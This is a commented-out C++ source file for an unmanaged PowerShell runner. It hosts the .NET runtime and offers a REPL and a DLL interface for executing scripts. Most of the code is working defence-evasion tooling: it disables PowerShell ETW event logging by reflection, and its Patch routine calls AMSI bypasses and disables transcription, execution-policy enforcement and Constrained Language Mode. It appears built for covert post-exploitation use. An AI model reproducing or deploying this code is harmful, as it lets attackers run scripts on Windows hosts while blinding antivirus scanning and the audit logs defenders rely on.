//    if (!clr.GetMethod(pExceptionType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"ToString", 0, &pToStringMethod)) goto exit;
//    if (!clr.InvokeMethod(pToStringMethod, vtReason, NULL, &vtExceptionAsString)) goto exit;
//
//    if (vtExceptionAsString.vt == VT_BSTR && vtExceptionAsString.bstrVal && wcslen(vtExceptionAsString.bstrVal) > 0) {
//        *pOut += std::wstring(vtExceptionAsString.bstrVal) + L"\n\n";
//    }
//
//exit:
//    if (pToStringMethod) pToStringMethod->Release();
//    if (pExceptionType) pExceptionType->Release();
//    if (pAsm) pAsm->Release();
//    VariantClear(&vtExceptionAsString);
//}
//
//// Mirror PrintPowerShellInvokeErrors (line ~537) — gom error stream + invocation reason
//// vào một std::wstring.
//void CollectPowerShellInvokeErrors(CLR& clr, VARIANT vtPowerShellInstance, std::wstring* pOut)
//{
//    VARIANT vtErrorStream = { 0 };
//    VARIANT vtInvocationStateInfo = { 0 };
//    VARIANT vtReason = { 0 };
//    _Type* pPowerShellType = NULL;
//    _Type* pPSInvocationStateInfoType = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) goto exit;
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pPowerShellType)) goto exit;
//
//    if (!PowerShellGetStream(clr, vtPowerShellInstance, L"Error", &vtErrorStream)) goto exit;
//
//    if (vtErrorStream.vt != VT_EMPTY) {
//        CollectPowerShellErrorStream(clr, vtErrorStream, pOut);
//    }
//
//    if (!clr.GetPropertyValue(pPowerShellType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPowerShellInstance, L"InvocationStateInfo", &vtInvocationStateInfo)) goto exit;
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PSInvocationStateInfo", &pPSInvocationStateInfoType)) goto exit;
//
//    if (!clr.GetPropertyValue(pPSInvocationStateInfoType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtInvocationStateInfo, L"Reason", &vtReason)) goto exit;
//
//    if (vtReason.vt != VT_EMPTY) {
//        CollectPowerShellInvocationStateInfoReason(clr, vtReason, pOut);
//    }
//
//exit:
//    if (pPSInvocationStateInfoType) pPSInvocationStateInfoType->Release();
//    if (pPowerShellType) pPowerShellType->Release();
//    if (pAsm) pAsm->Release();
//    VariantClear(&vtReason);
//    VariantClear(&vtInvocationStateInfo);
//    VariantClear(&vtErrorStream);
//}
//
//BOOL PowerShellHadErrors(CLR& clr, VARIANT vtPowerShellInstance, PBOOL pbHadErrors)
//{
//    BOOL bResult = FALSE;
//    VARIANT vtHadErrors = { 0 };
//    _Type* pPowerShellType = NULL;
//    _Assembly* pAsm = NULL;
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        goto exit;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pPowerShellType))
//        goto exit;
//
//    if (!clr.GetPropertyValue(pPowerShellType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPowerShellInstance, L"HadErrors", &vtHadErrors))
//        goto exit;
//
//    *pbHadErrors = vtHadErrors.boolVal;
//    bResult = TRUE;
//
//exit:
//    VariantClear(&vtHadErrors);
//    if (pPowerShellType) pPowerShellType->Release();
//    if (pAsm) pAsm->Release();
//
//    return bResult;
//}
//
////
//// The following function retrieves an instance of the PSEtwLogProvider class, gets
//// the value of its 'etwProvider' member, which is an EventProvider object, and sets
//// the 'm_enabled' attribute of this latter object to 0, thus effectively disabling
//// all PowerShell event logs in the current process. This includes Script Block
//// Logging and Module Logging.
//// 
//// Credit:
////   - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
////
//BOOL DisablePowerShellEtwProvider(CLR& clr)
//{
//    BOOL bResult = FALSE;
//    HRESULT hr;
//    VARIANT vtEmpty = { 0 };
//    VARIANT vtPsEtwLogProviderInstance = { 0 };
//    VARIANT vtZero = { 0 };
//    _Type* pPsEtwLogProviderType = NULL;
//    _Type* pEventProviderType = NULL;
//    _FieldInfo* pEnabledInfo = NULL;
//    _Assembly* pAsm = NULL;
//    _Assembly* pAsmCore = NULL;
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        goto exit;
//    }
//
//    if (!clr.LoadAssembly(L"System.Core", &pAsmCore)) {
//        goto exit;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.Tracing.PSEtwLogProvider", &pPsEtwLogProviderType)) {
//        goto exit;
//    }
//
//
//    if (!clr.GetFieldValue(pPsEtwLogProviderType, BindingFlags(BindingFlags_NonPublic | BindingFlags_Static), vtEmpty, L"etwProvider", &vtPsEtwLogProviderInstance)) {
//        goto exit;
//    }
//
//
//    if (!clr.GetType(pAsmCore, L"System.Diagnostics.Eventing.EventProvider", &pEventProviderType)) {
//        goto exit;
//    }
//
//
//    if (!clr.GetField(pEventProviderType, BindingFlags(BindingFlags_NonPublic | BindingFlags_Instance), L"m_enabled", &pEnabledInfo)) {
//        goto exit;
//    }
//
//    InitVariantFromInt32(0, &vtZero);
//
//    hr = pEnabledInfo->SetValue_2(vtPsEtwLogProviderInstance, vtZero);
//    if (FAILED(hr)) {
//        goto exit;
//    }
//
//    bResult = TRUE;
//
//exit:
//    if (pEnabledInfo) pEnabledInfo->Release();
//    if (pEventProviderType) pEventProviderType->Release();
//    if (pPsEtwLogProviderType) pPsEtwLogProviderType->Release();
//    if (pAsm) pAsm->Release();
//    if (pAsmCore) pAsmCore->Release();
//
//    VariantClear(&vtPsEtwLogProviderInstance);
//
//    return bResult;
//}
//
//void Patch(CLR& clr) {
//    if (!PatchAmsiOpenSession()) {
//        PRINT_ERROR("Failed to disable AMSI (1).\n");
//    }
//
//    if (!PatchAmsiScanBuffer()) {
//        PRINT_ERROR("Failed to disable AMSI (2).\n");
//    }
//
//    //if (!PatchEtw()) {
//    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
//    //}
//
//    //if (!PatchEtwRet(clr)) {
//    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
//    //}
//
//    if (!DisablePowerShellEtwProvider(clr)) {
//        PRINT_ERROR("Failed to disable ETW Provider.\n");
//        std::cout << "Failed to disable ETW Provider" << std::endl;
//    }
//
//    if (!PatchTranscriptionOptionFlushContentToDisk(clr)) {
//        PRINT_ERROR("Failed to disable Transcription.\n");
//    }
//
//    if (!PatchAuthorizationManagerShouldRunInternal(clr)) {
//        PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");
//    }
//
//    if (!PatchSystemPolicyGetSystemLockdownPolicy(clr)) {
//        PRINT_ERROR("Failed to disable Constrained Mode Language.\n");
//    }
//}
//
//#ifdef _WINDLL
//// ===== DLL build: exported API =====
//#define PS_API extern "C" __declspec(dllexport)
//
//// Internal PowerShell session state (single instance per DLL — thread-unsafe theo design).
//// Nếu cần multi-session, refactor thành struct + handle table.
//static struct {
//    BOOL bReady;
//    CLR clr;
//    _Assembly* pAsm;
//    _Assembly* pAsmSystemReflect;
//    _Type* pTypePS;
//    _MethodInfo* pMethodCreate;
//    _MethodInfo* pMethodAddScript;
//    _MethodInfo* pMethodInvoke;
//    VARIANT vtPSInstance;
//    SAFEARRAY* pEmptyArgs;
//} g_Session = { FALSE, {}, NULL, NULL, NULL, NULL, NULL, { 0 }, NULL };
//
//#else
//// ===== EXE build: standalone REPL =====
//
//int main() {
//    int nRet = 0;
//    CLR clr;
//    _Assembly* pAsm = NULL;
//    _Assembly* pAsmSystemReflect = NULL;
//    _Type* pTypePS = NULL;
//    _Type* pTypeRunspace = NULL;
//    _Type* pTypeRunspaceFactory = NULL;
//    _MethodInfo* pMethodCreate = NULL;
//    _MethodInfo* pMethodClose = NULL;
//    _MethodInfo* pMethodAddScript = NULL;
//    _MethodInfo* pMethodInvoke = NULL;
//    _MethodInfo* pMethodCreateRunspace = NULL;
//    _MethodInfo* pMethodOpen = NULL;
//    VARIANT vtPSInstance;
//    VariantInit(&vtPSInstance);
//    SAFEARRAY* pEmptyArgs = NULL;
//    VARIANT vtScript;
//    VariantInit(&vtScript);
//    VARIANT vtRunspace;
//    VariantInit(&vtRunspace);
//    SAFEARRAY* pArgs = NULL;
//    VARIANT vtResult;
//    VariantInit(&vtResult);
//    VARIANT vtRunspaceProperty;
//    VariantInit(&vtRunspaceProperty);
//    long idx = 0;
//    BOOL bHadErrors = FALSE;
//    //execute_debug_context();
//    if (!clr.InitCLR()) {
//        wprintf(L"[!] Failed to init CLR\n");
//        return 0;
//    }
//
//    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
//        wprintf(L"[!] Failed to load assembly\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.LoadAssembly(L"System.Reflection", &pAsmSystemReflect)) {
//        wprintf(L"[!] Failed to load assembly\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pTypePS)) {
//        wprintf(L"[!] Failed to get PowerShell type\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.Runspaces.RunspaceFactory", &pTypeRunspaceFactory)) {
//        wprintf(L"[!] Failed to get PowerShell type RunspaceFactory\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.GetType(pAsm, L"System.Management.Automation.Runspaces.Runspace", &pTypeRunspace)) {
//        wprintf(L"[!] Failed to get PowerShell type Runspace\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.GetMethod(pTypeRunspaceFactory, BindingFlags(BindingFlags_Public | BindingFlags_Static), L"CreateRunspace", 0, &pMethodCreateRunspace)) {
//        wprintf(L"[!] Failed to get CreateRunspace method\n");
//        goto cleanup;
//    }
//
//    if (!clr.GetMethod(pTypeRunspace, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Open", 0, &pMethodOpen)) {
//        wprintf(L"[!] Failed to get Open method\n");
//        goto cleanup;
//    }
//
//    if (!clr.GetMethod(pTypeRunspace, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Open", 0, &pMethodClose)) {
//        wprintf(L"[!] Failed to get Open method\n");
//        goto cleanup;
//    }
//
//    if (!clr.GetMethod(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Static), L"Create", 0, &pMethodCreate)) {
//        wprintf(L"[!] Failed to get Create method\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.GetMethod(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"AddScript", 1, &pMethodAddScript)) {
//        wprintf(L"[!] Failed to get AddScript method\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    if (!clr.GetMethod(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Invoke", 0, &pMethodInvoke)) {
//        wprintf(L"[!] Failed to get Invoke method\n");
//        nRet = 0;
//        goto cleanup;
//    }
//
//    //if (!PatchEtwRet(clr)) {
//    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
//    //}
//
//    //if (!PatchEtw()) {
//    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
//    //}
//
//    //Patch(clr);
//
//    //if (!PatchEtw()) {
//    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
//    //}
//
//    // Create runspace instance
//    //if (!clr.InvokeMethod(pMethodCreateRunspace, vtRunspace, NULL, &vtRunspace)) {
//    //    wprintf(L"[!] Failed to Create Runspace\n");
//    //    nRet = 0;
//    //    goto cleanup;
//    //}
//
//    //if (!clr.InvokeMethod(pMethodOpen, vtRunspace, NULL, NULL)) {
//    //    wprintf(L"[!] Failed to Open Runspace\n");
//    //    nRet = 0;
//    //    goto cleanup;
//    //}
//
//    while (true) {
//        if (!clr.InvokeMethod(pMethodCreate, vtPSInstance, NULL, &vtPSInstance)) {
//            wprintf(L"[!] Failed to create PowerShell instance\n");
//            nRet = 0;
//            goto cleanup;
//        }
//
//        //MessageBoxA(NULL, NULL, NULL, 0);
//        //if (!clr.GetPropertyValue(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPSInstance, L"Runspace", &vtRunspaceProperty)) {
//        //    wprintf(L"[!] Failed to get property Runspace\n");
//        //    nRet = 0;
//        //    goto cleanup;
//        //}
//
//        //if (!clr.SetPropertyValue(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPSInstance, L"Runspace", vtRunspace)) {
//        //    wprintf(L"[!] Failed to set property Runspace\n");
//        //    nRet = 0;
//        //    goto cleanup;
//        //}
//
//        wprintf(L"PS> ");
//
//        std::wstring input;
//        std::getline(std::wcin, input);
//
//        if (input == L"exit" || input == L"quit")
//            break;
//
//        if (input.empty())
//            continue;
//
//        BSTR bstrScript = SysAllocString(input.c_str());
//        if (!bstrScript) goto cleanup;
//        vtScript.vt = VT_BSTR;
//        vtScript.bstrVal = bstrScript;
//
//        pArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
//        if (!pArgs) goto cleanup;
//        if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtScript))) goto cleanup;
//        VariantClear(&vtResult);
//        VariantInit(&vtResult);
//        clr.InvokeMethod(pMethodAddScript, vtPSInstance, pArgs, &vtResult);
//
//        SafeArrayDestroy(pArgs);
//        pArgs = NULL;
//        VariantClear(&vtScript);
//        VariantClear(&vtResult);
//
//        VariantInit(&vtResult);
//
//        Patch(clr);
//
//        if (clr.InvokeMethod(pMethodInvoke, vtPSInstance, NULL, &vtResult)) {
//            PrintPowerShellOutput(clr, vtResult);
//        }
//        if (!PowerShellHadErrors(clr, vtPSInstance, &bHadErrors))
//            goto cleanup;
//
//        if (bHadErrors)
//        {
//            PrintPowerShellInvokeErrors(clr, vtPSInstance);
//
//            // Reset PowerShell instance: release cái cũ, tạo cái mới.
//            // Cách này xóa mọi errors/streams/commands — không cần gọi Clear() từng phần.
//            VariantClear(&vtPSInstance);
//        }
//
//        VariantClear(&vtResult);
//    }
//
//    nRet = 1;
//
//cleanup:
//
//    // SAFEARRAY arguments
//    if (pArgs)
//    {
//        SafeArrayDestroy(pArgs);
//        pArgs = NULL;
//    }
//
//    if (pEmptyArgs)
//    {
//        SafeArrayDestroy(pEmptyArgs);
//        pEmptyArgs = NULL;
//    }
//
//    // VARIANTs
//    VariantClear(&vtResult);
//    VariantClear(&vtScript);
//    VariantClear(&vtPSInstance);
//    VariantClear(&vtRunspaceProperty);
//
//    // Close Runspace before releasing it
//    if (pMethodClose && vtRunspace.vt != VT_EMPTY)
//    {
//        clr.InvokeMethod(pMethodClose, vtRunspace, NULL, NULL);
//    }
//
//    VariantClear(&vtRunspace);
//
//    // Methods
//    if (pMethodClose)
//        pMethodClose->Release();
//
//    if (pMethodOpen)
//        pMethodOpen->Release();
//
//    if (pMethodCreateRunspace)
//        pMethodCreateRunspace->Release();
//
//    if (pMethodInvoke)
//        pMethodInvoke->Release();
//
//    if (pMethodAddScript)
//        pMethodAddScript->Release();
//
//    if (pMethodCreate)
//        pMethodCreate->Release();
//
//    // Types
//    if (pTypeRunspace)
//        pTypeRunspace->Release();
//
//    if (pTypeRunspaceFactory)
//        pTypeRunspaceFactory->Release();
//
//    if (pTypePS)
//        pTypePS->Release();
//
//    // Assemblies
//    if (pAsmSystemReflect)
//        pAsmSystemReflect->Release();
//
//    if (pAsm)
//        pAsm->Release();
//
//    return nRet;
//}
//
//#endif // !_WINDLL (REPL)
//
//#ifdef _WINDLL
//// ===== DLL EXPORTS =====
////
//// C interface exported từ DLL để caller (C/C++/any FFI) dùng:
////   PS_Init()                  : setup CLR, load System.Management.Automation, lookup methods,
////                                create PowerShell instance, apply patches (AMSI/ETW/Transcription).
////                                Idempotent — gọi nhiều lần OK.
////   PS_Execute(script)         : chạy 1 PowerShell pipeline. Trả về BSTR (caller SysFreeString).
////                                NULL = error. Pipes output qua Out-String nên return là plain text.
////   PS_Reset()                 : dispose instance hiện tại + tạo mới. Gọi khi script làm hỏng state
////                                (vd: gọi [System.Management.Automation.PowerShell]::Create() trong script).
////   PS_Shutdown()              : cleanup toàn bộ. Idempotent.
////
//// Threading: single global session, KHÔNG thread-safe. Caller tự sync nếu dùng đa luồng.
//
//PS_API BOOL PS_Init() {
//    if (g_Session.bReady) return TRUE;
//
//    if (!g_Session.clr.InitCLR()) {
//        return FALSE;
//    }
//
//    if (!g_Session.clr.LoadAssembly(L"System.Reflection", &g_Session.pAsmSystemReflect)) {
//        return FALSE;
//    }
//
//    if (!g_Session.clr.LoadAssembly(L"System.Management.Automation", &g_Session.pAsm)) {
//        return FALSE;
//    }
//
//    if (!g_Session.clr.GetType(g_Session.pAsm, L"System.Management.Automation.PowerShell", &g_Session.pTypePS)) {
//        return FALSE;
//    }
//
//    if (!g_Session.clr.GetMethod(g_Session.pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Static), L"Create", 0, &g_Session.pMethodCreate)) {
//        return FALSE;
//    }
//
//    if (!g_Session.clr.GetMethod(g_Session.pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"AddScript", 1, &g_Session.pMethodAddScript)) {
//        return FALSE;
//    }
//
//    if (!g_Session.clr.GetMethod(g_Session.pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Invoke", 0, &g_Session.pMethodInvoke)) {
//        return FALSE;
//    }
//
//    VariantInit(&g_Session.vtPSInstance);
//    g_Session.pEmptyArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
//    if (!g_Session.pEmptyArgs) return FALSE;
//
//    if (!g_Session.clr.InvokeMethod(g_Session.pMethodCreate, g_Session.vtPSInstance, g_Session.pEmptyArgs, &g_Session.vtPSInstance)) {
//        SafeArrayDestroy(g_Session.pEmptyArgs);
//        g_Session.pEmptyArgs = NULL;
//        return FALSE;
//    }
//
//    // Apply AMSI bypass + ETW disable + Transcription disable — cùng patch như REPL.
//    Patch(g_Session.clr);
//
//    g_Session.bReady = TRUE;
//    return TRUE;
//}
//
//// Helper: gọi Reset thủ công nếu cần dispose instance mà không thoát DLL.
//static BOOL PS_ResetInternal() {
//    VariantClear(&g_Session.vtPSInstance);
//    VariantInit(&g_Session.vtPSInstance);
//
//    if (!g_Session.clr.InvokeMethod(g_Session.pMethodCreate, g_Session.vtPSInstance, g_Session.pEmptyArgs, &g_Session.vtPSInstance)) {
//        return FALSE;
//    }
//
//    // Re-apply patches trên instance mới (state đã reset).
//    Patch(g_Session.clr);
//    return TRUE;
//}
//
//PS_API BOOL PS_Reset() {
//    if (!g_Session.bReady) return FALSE;
//    return PS_ResetInternal();
//}
//
//PS_API void PS_Shutdown() {
//    if (!g_Session.bReady) return;
//
//    VariantClear(&g_Session.vtPSInstance);
//
//    if (g_Session.pMethodInvoke) {
//        g_Session.pMethodInvoke->Release();
//        g_Session.pMethodInvoke = NULL;
//    }
//    if (g_Session.pMethodAddScript) {
//        g_Session.pMethodAddScript->Release();
//        g_Session.pMethodAddScript = NULL;
//    }
//    if (g_Session.pMethodCreate) {
//        g_Session.pMethodCreate->Release();
//        g_Session.pMethodCreate = NULL;
//    }
//    if (g_Session.pTypePS) {
//        g_Session.pTypePS->Release();
//        g_Session.pTypePS = NULL;
//    }
//    if (g_Session.pAsm) {
//        g_Session.pAsm->Release();
//        g_Session.pAsm = NULL;
//    }
//    if (g_Session.pEmptyArgs) {
//        SafeArrayDestroy(g_Session.pEmptyArgs);
//        g_Session.pEmptyArgs = NULL;
//    }
//
//    g_Session.clr.FreeCLR();
//    g_Session.bReady = FALSE;
//}
//
//// PS_Execute: chạy 1 PowerShell command, trả về BSTR (caller SysFreeString).
//// NULL nếu lỗi. Tự pipe qua Out-String để output là plain text.
//// Tự reset instance khi gặp lỗi (giống REPL main).
//PS_API BSTR PS_Execute(LPCWSTR pwszScript) {
//    if (!g_Session.bReady || !pwszScript) return NULL;
//
//    BSTR bstrFinal = NULL;
//    long idx = 0;
//    VARIANT vtScript;
//    VariantInit(&vtScript);
//    SAFEARRAY* pArgs = NULL;
//    VARIANT vtResult;
//    VariantInit(&vtResult);
//    std::wstring out;
//    BOOL bHadErrors = FALSE;
//
//    BSTR bstrScript = SysAllocString(pwszScript.c_str());
//    if (!bstrScript) goto cleanup;
//    vtScript.vt = VT_BSTR;
//    vtScript.bstrVal = bstrScript;
//
//    pArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
//    if (!pArgs) goto cleanup;
//    if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtScript))) goto cleanup;
//
//    VariantClear(&vtResult);
//    VariantInit(&vtResult);
//    g_Session.clr.InvokeMethod(g_Session.pMethodAddScript, g_Session.vtPSInstance, pArgs, &vtResult);
//
//    SafeArrayDestroy(pArgs);
//    pArgs = NULL;
//    VariantClear(&vtScript);
//    VariantClear(&vtResult);
//
//    VariantInit(&vtResult);
//    if (!g_Session.clr.InvokeMethod(g_Session.pMethodInvoke, g_Session.vtPSInstance, NULL, &vtResult)) {
//        goto cleanup;
//    }
//
//    CollectOutput(g_Session.clr, vtResult, &out);
//
//    // Nếu có errors, thu thập tất cả errors + invocation reason vào output trước khi reset.
//    if (PowerShellHadErrors(g_Session.clr, g_Session.vtPSInstance, &bHadErrors) && bHadErrors) {
//        std::wstring errOut;
//        CollectPowerShellInvokeErrors(g_Session.clr, g_Session.vtPSInstance, &errOut);
//        if (!errOut.empty()) {
//            if (!out.empty()) out += L"\n";
//            out += L"[ERR]\n" + errOut;
//        }
//        PS_ResetInternal();
//    }
//
//    if (!out.empty()) {
//        bstrFinal = SysAllocString(out.c_str());
//    }
//
//cleanup:
//    VariantClear(&vtResult);
//    if (pArgs) SafeArrayDestroy(pArgs);
//    VariantClear(&vtScript);
//    return bstrFinal;
//}
//
//// DLL entry point — chỉ cần thiết nếu cần cleanup ở process detach.
//BOOL APIENTRY DllMain(HMODULE hModule, DWORD ulReasonForCall, LPVOID lpReserved) {
//    switch (ulReasonForCall) {
//    case DLL_PROCESS_ATTACH:
//        DisableThreadLibraryCalls(hModule);
//        break;
//    case DLL_PROCESS_DETACH:
//        // Không auto-call PS_Shutdown() ở đây — COM cleanup có thể không an toàn tại DllMain.
//        // Caller phải gọi PS_Shutdown() explicitly.
//        break;
//    }
//    return TRUE;
//}
//
//#endif
